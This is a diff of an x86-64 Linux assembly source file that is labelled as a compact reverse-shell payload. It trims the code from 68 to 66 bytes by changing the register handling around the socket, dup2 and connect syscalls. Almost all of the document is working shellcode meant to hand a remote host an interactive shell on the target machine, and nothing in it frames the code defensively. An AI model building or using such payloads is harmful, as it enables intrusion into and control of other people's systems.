@@ -28,7 +28,7 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 68 byte reverse shell for linux/x86-64
+; 66 byte reverse shell for linux/x86-64
 ; odzhan
 
     bits    64
@@ -37,7 +37,6 @@
     not     rax
     push    rax
     push    rsp
-    pop     rbp
     
     ; step 1, create a socket
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -60,12 +59,11 @@
 dup_loop64:
     mov     al, 33           ; rax=sys_dup2
     syscall
-    dec     rsi              ; watch out for that bug copycats ;-)
+    sub     esi, 1           ; watch out for that bug ;-)
     jns     dup_loop64       ; jump if not signed
     
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));
-    push    rbp
     pop     rsi
     mov     dl, 16           ; rdx=sizeof(sa)
     mov     al, 42           ; rax=sys_connect
